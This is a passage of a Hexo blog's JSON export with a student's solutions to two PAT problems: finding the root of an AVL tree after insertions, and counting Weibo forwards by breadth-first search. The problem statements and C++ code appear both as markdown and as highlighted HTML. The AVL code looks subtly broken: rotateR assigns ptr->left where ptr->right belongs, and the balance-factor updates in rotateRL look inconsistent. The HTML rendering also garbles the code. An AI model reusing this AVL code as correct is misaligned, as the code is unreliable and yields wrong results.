class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>An AVL tree is a self-balancing binary search tree. In an AVL tree, the heights of the two child subtrees of any node differ by at most one; if at any time they differ by more than one, rebalancing is done to restore this property. Figures 1-4 illustrate the rotation rules.</p>\n<p><img src=\"/2017/02/17/PAT-advanced-1066/1.jpg\" alt=\"1\"> <img src=\"/2017/02/17/PAT-advanced-1066/2.jpg\" alt=\"2\"></p>\n<p><img src=\"/2017/02/17/PAT-advanced-1066/3.jpg\" alt=\"3\"> <img src=\"/2017/02/17/PAT-advanced-1066/4.jpg\" alt=\"4\"></p>\n<p>Now given a sequence of insertions, you are supposed to tell the root of the resulting AVL tree.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains a positive integer N (&lt;=20) which is the total number of keys to be inserted. Then N distinct integer keys are given in the next line. All the numbers in a line are separated by a space.</p>\n<p>Output Specification:</p>\n<p>For each test case, print ythe root of the resulting AVL tree in one line.</p>\n<p>Sample Input 1:<br>5<br>88 70 61 96 120<br>Sample Output 1:<br>70</p>\n<p>Sample Input 2:<br>7<br>88 70 61 96 120 90 65<br>Sample Output 2:<br>88</p>\n</blockquote>\n<p>照着数据结构的书打的，等会再做1123复习下。。<br>照着书还打错一遍Orz</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div></pre></td><td class=\"code\"><pre><div class=\"line\">#include&lt;stack&gt;</div><div class=\"line\">#include&lt;cstdio&gt;  </div><div class=\"line\">#include&lt;string&gt;  </div><div class=\"line\">#include&lt;cstring&gt;  </div><div class=\"line\">#include&lt;vector&gt;  </div><div class=\"line\">#include&lt;iostream&gt;  </div><div class=\"line\">#include&lt;queue&gt;  </div><div class=\"line\">#include&lt;algorithm&gt;  </div><div class=\"line\">using namespace std;</div><div class=\"line\">typedef long long LL;</div><div class=\"line\">struct avlndoe&#123;</div><div class=\"line\">\tint bf;</div><div class=\"line\">\tint <span class=\"keyword\">data</span>;</div><div class=\"line\">\tavlndoe *left;</div><div class=\"line\">\tavlndoe *right;</div><div class=\"line\">\tavlndoe(int d, avlndoe *l = NULL, avlndoe *r = NULL) : left(l), right(r), <span class=\"keyword\">data</span>(d), bf(<span class=\"number\">0</span>)&#123;&#125;</div><div class=\"line\">&#125;* root;</div><div class=\"line\"></div><div class=\"line\">int n, <span class=\"keyword\">data</span>;</div><div class=\"line\"></div><div class=\"line\">void rotateL(avlndoe * &amp; ptr)&#123;</div><div class=\"line\">\tavlndoe * subL = ptr;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span> = subL-&gt;</span>right;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">subL</span>-&gt;</span><span class=\"function\"><span class=\"title\">right</span> = ptr-&gt;</span>left;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>left = subL;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> = subL-&gt;</span>bf = <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">void rotateR(avlndoe * &amp; ptr)&#123;</div><div class=\"line\">\tavlndoe * subR = ptr;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span> = subR-&gt;</span>left;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">subR</span>-&gt;</span><span class=\"function\"><span class=\"title\">left</span> = ptr-&gt;</span>left;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>right = subR;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> = subR-&gt;</span>bf = <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">void rotateLR(avlndoe * &amp; ptr)&#123;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">avlndoe</span> * subR = ptr, *subL = subR-&gt;</span>left;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span> = subL-&gt;</span>right;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">subL</span>-&gt;</span><span class=\"function\"><span class=\"title\">right</span> = ptr-&gt;</span>left;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>left = subL;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> &lt;= 0 ? subL-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> = 0 : subL-&gt;</span>bf = -<span class=\"number\">1</span>;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">subR</span>-&gt;</span><span class=\"function\"><span class=\"title\">left</span> = ptr-&gt;</span>right;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>right = subR;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> == -1 ? subR-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> = 1 : subR-&gt;</span>bf = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>bf = <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">void rotateRL(avlndoe * &amp; ptr)&#123;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">avlndoe</span> * subL = ptr, *subR = subL-&gt;</span>right;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span> = subR-&gt;</span>left;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">subR</span>-&gt;</span><span class=\"function\"><span class=\"title\">left</span> = ptr-&gt;</span>right;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>right = subR;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> &gt;= 0 ? subR-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> = 0 : subL-&gt;</span>bf = <span class=\"number\">1</span>;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">subL</span>-&gt;</span><span class=\"function\"><span class=\"title\">right</span> = ptr-&gt;</span>left;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>left = subL;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> == 1 ? subL-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> = -1 : subL-&gt;</span>bf = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>bf = <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">bool Insert(avlndoe * &amp; ptr , int &amp;el)&#123;</div><div class=\"line\">\tavlndoe * pr = NULL, *p = ptr, *q; int d;</div><div class=\"line\">\tstack&lt;avlndoe *&gt; st;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (p != NULL)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"function\"><span class=\"title\">if</span> (el == p-&gt;</span><span class=\"keyword\">data</span>) return <span class=\"literal\">false</span>;</div><div class=\"line\">\t\tpr = p; st.push(pr);</div><div class=\"line\">\t\t(<span class=\"function\"><span class=\"title\">el</span> &lt; p-&gt;</span><span class=\"function\"><span class=\"title\">data</span>) ? p = p-&gt;</span><span class=\"function\"><span class=\"title\">left</span> : p = p-&gt;</span>right;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\tp = new avlndoe(el);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (pr == NULL) &#123; ptr = p; return <span class=\"literal\">true</span>; &#125;</div><div class=\"line\">\t(<span class=\"function\"><span class=\"title\">el</span> &lt; pr-&gt;</span><span class=\"function\"><span class=\"title\">data</span>) ? pr-&gt;</span><span class=\"function\"><span class=\"title\">left</span> = p : pr-&gt;</span>right = p;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (!st.empty())</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tpr = st.top();st.pop();</div><div class=\"line\">\t\t(<span class=\"function\"><span class=\"title\">p</span> == pr-&gt;</span><span class=\"function\"><span class=\"title\">left</span>) ? pr-&gt;</span><span class=\"function\"><span class=\"title\">bf</span>-- : pr-&gt;</span>bf++;</div><div class=\"line\">\t\t<span class=\"function\"><span class=\"title\">if</span> (pr-&gt;</span>bf == <span class=\"number\">0</span>) break;</div><div class=\"line\">\t\t<span class=\"function\"><span class=\"title\">if</span> (pr-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> == 1 || pr-&gt;</span>bf == -<span class=\"number\">1</span>)</div><div class=\"line\">\t\t\tp = pr;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"function\"><span class=\"title\">d</span> = (pr-&gt;</span>bf &lt; <span class=\"number\">0</span>) ? -<span class=\"number\">1</span> : <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t<span class=\"function\"><span class=\"title\">if</span> (p-&gt;</span>bf == d)</div><div class=\"line\">\t\t\t\t(d == -<span class=\"number\">1</span>) ? rotateR(pr) : rotateL(pr);</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\t\t(d == -<span class=\"number\">1</span>) ? rotateLR(pr) : rotateRL(pr);</div><div class=\"line\">\t\t\tbreak;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (st.empty())ptr = pr;</div><div class=\"line\">\t<span class=\"keyword\">else</span></div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tq = st.top();</div><div class=\"line\">\t\t(<span class=\"function\"><span class=\"title\">q</span>-&gt;</span><span class=\"function\"><span class=\"title\">data</span> &gt; pr-&gt;</span><span class=\"function\"><span class=\"title\">data</span>) ? q-&gt;</span><span class=\"function\"><span class=\"title\">left</span> = pr : q-&gt;</span>right = pr;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\treturn <span class=\"literal\">true</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">int main()</div><div class=\"line\">&#123;</div><div class=\"line\">\tcin &gt;&gt; n;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (n--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tcin &gt;&gt; <span class=\"keyword\">data</span>;</div><div class=\"line\">\t\tInsert(root, <span class=\"keyword\">data</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">cout</span> &lt;&lt; root-&gt;</span><span class=\"keyword\">data</span> <span class=\"string\">&lt;&lt; endl;</span></div><div class=\"line\">\treturn 0;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1076","date":"2017-02-21T06:54:07.000Z","_content":"\n## Description\n\n> 1076.Forwards on Weibo\n\n> Weibo is known as the Chinese version of Twitter. One user on Weibo may have many followers, and may follow many other users as well. Hence a social network is formed with followers relations. When a user makes a post on Weibo, all his/her followers can view and forward his/her post, which can then be forwarded again by their followers. Now given a social network, you are supposed to calculate the maximum potential amount of forwards for any specific user, assuming that only L levels of indirect followers are counted.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains 2 positive integers: N (<=1000), the number of users; and L (<=6), the number of levels of indirect followers that are counted. Hence it is assumed that all the users are numbered from 1 to N. Then N lines follow, each in the format:\n\n> M[i] user_list[i]\n\n> where M[i] (<=100) is the total number of people that user[i] follows; and user_list[i] is a list of the M[i] users that are followed by user[i]. It is guaranteed that no one can follow oneself. All the numbers are separated by a space.\n\n> Then finally a positive K is given, followed by K UserID's for query.\n\n> Output Specification:\n\n> For each UserID, you are supposed to print in one line the maximum potential amount of forwards this user can triger, assuming that everyone who can view the initial post will forward it once, and that only L levels of indirect followers are counted.\n\n> Sample Input:\n7 3\n3 2 3 4\n0\n2 5 6\n2 3 1\n2 3 4\n1 4\n1 5\n2 2 6\n\n> Sample Output:\n4\n5\n\n哇，难得的一次过233。。。BFS\n\n## Code\n\n```\n#include<cstdio>\n#include<cmath>\n#include<iostream>\n#include<algorithm>\n#include<limits>\n#include<queue>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = (1e3 + 10) + 1;\nint n, l;\nint m[maxN][maxN];\nint lay[maxN];\nbool vis[maxN];\nint x, y;\nint p;\nint ans[maxN];\nqueue<int> q;\n\nint bfs(int root, int l)\n{\n\tint w; int flag = 1; int ans = 0;\n\tfor (int i = 1; i < maxN; i++)\n\t\tvis[i] = false;\n\tq.push(root);\n\tvis[root] = true;\n\tlay[root] = 0;\n\twhile (!q.empty())\n\t{\n\t\tflag = 1;\n\t\troot = q.front();\n\t\tq.pop();\n\t\tw = m[root][flag];\n\t\t\twhile (w)\n\t\t\t{\n\t\t\t\tif (!vis[w])\n\t\t\t\t{\n\t\t\t\t\tvis[w] = true;\n\t\t\t\t\tlay[w] = lay[root] + 1;\n\t\t\t\t\tq.push(w);\n\t\t\t\t\tif (lay[w] <= l )\n\t\t\t\t\t\tans++;\n\t\t\t\t}\n\t\t\t\tflag++;\n\t\t\t\tw = m[root][flag];\n\t\t\t}\n\t}\n\treturn ans;\n}\n\nint main()\n{\n\tscanf(\"%d%d\", &n, &l);\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tscanf(\"%d\", &x);\n\t\tfor (int j = 1; j <= x; j++)\n\t\t{\n\t\t\tscanf(\"%d\", &y);\n\t\t\tm[y][++m[y][0]] = i;\n\t\t\t//m[i][j] = y;\n\t\t}\n\t}\n\tscanf(\"%d\", &p);\n\tfor (int i = 1; i <= p; i++)\n\t\tscanf(\"%d\", &ans[i]);\n\tfor (int i = 1; i <= p; i++)\n\t{\n\t\tprintf(\"%d\\n\", bfs(ans[i], l));\n\t}\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1076.md","raw":"---\ntitle: PAT advanced 1076\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-21 14:54:07\n---\n\n## Description\n\n> 1076.Forwards on Weibo\n\n> Weibo is known as the Chinese version of Twitter. One user on Weibo may have many followers, and may follow many other users as well. Hence a social network is formed with followers relations. When a user makes a post on Weibo, all his/her followers can view and forward his/her post, which can then be forwarded again by their followers. Now given a social network, you are supposed to calculate the maximum potential amount of forwards for any specific user, assuming that only L levels of indirect followers are counted.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains 2 positive integers: N (<=1000), the number of users; and L (<=6), the number of levels of indirect followers that are counted. Hence it is assumed that all the users are numbered from 1 to N. Then N lines follow, each in the format:\n\n> M[i] user_list[i]\n\n> where M[i] (<=100) is the total number of people that user[i] follows; and user_list[i] is a list of the M[i] users that are followed by user[i]. It is guaranteed that no one can follow oneself. All the numbers are separated by a space.\n\n> Then finally a positive K is given, followed by K UserID's for query.\n\n> Output Specification:\n\n> For each UserID, you are supposed to print in one line the maximum potential amount of forwards this user can triger, assuming that everyone who can view the initial post will forward it once, and that only L levels of indirect followers are counted.\n\n> Sample Input:\n7 3\n3 2 3 4\n0\n2 5 6\n2 3 1\n2 3 4\n1 4\n1 5\n2 2 6\n\n> Sample Output:\n4\n5\n\n哇，难得的一次过233。。。BFS\n\n## Code\n\n```\n#include<cstdio>\n#include<cmath>\n#include<iostream>\n#include<algorithm>\n#include<limits>\n#include<queue>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = (1e3 + 10) + 1;\nint n, l;\nint m[maxN][maxN];\nint lay[maxN];\nbool vis[maxN];\nint x, y;\nint p;\nint ans[maxN];\nqueue<int> q;\n\nint bfs(int root, int l)\n{\n\tint w; int flag = 1; int ans = 0;\n\tfor (int i = 1; i < maxN; i++)\n\t\tvis[i] = false;\n\tq.push(root);\n\tvis[root] = true;\n\tlay[root] = 0;\n\twhile (!q.empty())\n\t{\n\t\tflag = 1;\n\t\troot = q.front();\n\t\tq.pop();\n\t\tw = m[root][flag];\n\t\t\twhile (w)\n\t\t\t{\n\t\t\t\tif (!vis[w])\n\t\t\t\t{\n\t\t\t\t\tvis[w] = true;\n\t\t\t\t\tlay[w] = lay[root] + 1;\n\t\t\t\t\tq.push(w);\n\t\t\t\t\tif (lay[w] <= l )\n\t\t\t\t\t\tans++;\n\t\t\t\t}\n\t\t\t\tflag++;\n\t\t\t\tw = m[root][flag];\n\t\t\t}\n\t}\n\treturn ans;\n}\n\nint main()\n{\n\tscanf(\"%d%d\", &n, &l);\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tscanf(\"%d\", &x);\n\t\tfor (int j = 1; j <= x; j++)\n\t\t{\n\t\t\tscanf(\"%d\", &y);\n\t\t\tm[y][++m[y][0]] = i;\n\t\t\t//m[i][j] = y;\n\t\t}\n\t}\n\tscanf(\"%d\", &p);\n\tfor (int i = 1; i <= p; i++)\n\t\tscanf(\"%d\", &ans[i]);\n\tfor (int i = 1; i <= p; i++)\n\t{\n\t\tprintf(\"%d\\n\", bfs(ans[i], l));\n\t}\n\treturn 0;\n}\n```","slug":"PAT-advanced-1076","published":1,"updated":"2017-02-21T07:00:02.781Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k0m002lhv181m0kdfp4","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1076.Forwards on Weibo</p>\n<p>Weibo is known as the Chinese version of Twitter. One user on Weibo may have many followers, and may follow many other users as well. Hence a social network is formed with followers relations. When a user makes a post on Weibo, all his/her followers can view and forward his/her post, which can then be forwarded again by their followers. Now given a social network, you are supposed to calculate the maximum potential amount of forwards for any specific user, assuming that only L levels of indirect followers are counted.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains 2 positive integers: N (&lt;=1000), the number of users; and L (&lt;=6), the number of levels of indirect followers that are counted. Hence it is assumed that all the users are numbered from 1 to N. Then N lines follow, each in the format:</p>\n<p>M[i] user_list[i]</p>\n<p>where M[i] (&lt;=100) is the total number of people that user[i] follows; and user_list[i] is a list of the M[i] users that are followed by user[i]. It is guaranteed that no one can follow oneself. All the numbers are separated by a space.</p>\n<p>Then finally a positive K is given, followed by K UserID’s for query.</p>\n<p>Output Specification:</p>\n<p>For each UserID, you are supposed to print in one line the maximum potential amount of forwards this user can triger, assuming that everyone who can view the initial post will forward it once, and that only L levels of indirect followers are counted.</p>\n<p>Sample Input:<br>7 3<br>3 2 3 4<br>0<br>2 5 6<br>2 3 1<br>2 3 4<br>1 4<br>1 5<br>2 2 6</p>\n<p>Sample Output:<br>4<br>5</p>\n</blockquote>\n<p>哇，难得的一次过233。。。BFS</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cmath&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;limits&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = (<span class=\"number\">1e3</span> + <span class=\"number\">10</span>) + <span class=\"number\">1</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> n, l;</div><div class=\"line\"><span class=\"keyword\">int</span> m[maxN][maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> lay[maxN];</div><div class=\"line\"><span class=\"keyword\">bool</span> vis[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> x, y;</div><div class=\"line\"><span class=\"keyword\">int</span> p;</div><div class=\"line\"><span class=\"keyword\">int</span> ans[maxN];</div><div class=\"line\"><span class=\"built_in\">queue</span>&lt;<span class=\"keyword\">int</span>&gt; q;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bfs</span><span class=\"params\">(<span class=\"keyword\">int</span> root, <span class=\"keyword\">int</span> l)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> w; <span class=\"keyword\">int</span> flag = <span class=\"number\">1</span>; <span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt; maxN; i++)</div><div class=\"line\">\t\tvis[i] = <span class=\"literal\">false</span>;</div><div class=\"line\">\tq.push(root);</div><div class=\"line\">\tvis[root] = <span class=\"literal\">true</span>;</div><div class=\"line\">\tlay[root] = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (!q.empty())</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tflag = <span class=\"number\">1</span>;</div><div class=\"line\">\t\troot = q.front();</div><div class=\"line\">\t\tq.pop();</div><div class=\"line\">\t\tw = m[root][flag];</div><div class=\"line\">\t\t\t<span class=\"keyword\">while</span> (w)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (!vis[w])</div><div class=\"line\">\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\tvis[w] = <span class=\"literal\">true</span>;</div><div class=\"line\">\t\t\t\t\tlay[w] = lay[root] + <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\t\tq.push(w);</div><div class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (lay[w] &lt;= l )</div><div class=\"line\">\t\t\t\t\t\tans++;</div><div class=\"line\">\t\t\t\t&#125;</div><div class=\"line\">\t\t\t\tflag++;</div><div class=\"line\">\t\t\t\tw = m[root][flag];</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> ans;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;n, &amp;l);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt;= x; j++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;y);</div><div class=\"line\">\t\t\tm[y][++m[y][<span class=\"number\">0</span>]] = i;</div><div class=\"line\">\t\t\t<span class=\"comment\">//m[i][j] = y;</span></div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;p);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= p; i++)</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;ans[i]);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= p; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, bfs(ans[i], l));</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1076.Forwards on Weibo</p>\n<p>Weibo is known as the Chinese version of Twitter. One user on Weibo may have many followers, and may follow many other users 